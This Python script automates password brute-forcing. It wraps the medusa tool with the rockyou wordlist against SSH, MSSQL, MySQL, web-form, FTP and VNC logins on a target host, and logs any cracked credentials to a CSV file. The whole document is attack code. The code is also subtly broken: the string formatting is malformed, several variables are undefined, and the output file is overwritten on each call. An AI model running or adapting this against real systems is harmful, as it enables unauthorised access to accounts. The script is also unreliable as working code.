#!/usr/bin/env python

import subprocess

def sshCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ssh > " + root + "discovery/ssh/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + ssh + "\n")
	fo.close()
	return

def mssqlCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mssql > " + root + "discovery/mssql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + mssql + "\n")
	fo.close()
	return

def mysqlCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mysql  > " + root + "discovery/mysql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + mysql + "\n")
	fo.close()
	return

def webformCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M web-form  > " + root + "discovery/http/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + web + "\n")
	fo.close()
	return

def ftpCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ftp > " + root + "discovery/ftp/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + ftp + "\n")
	fo.close()
	return

def vncCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M vnc > " + root + "discovery/vnc/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + vnc + "\n")
	fo.close()
	return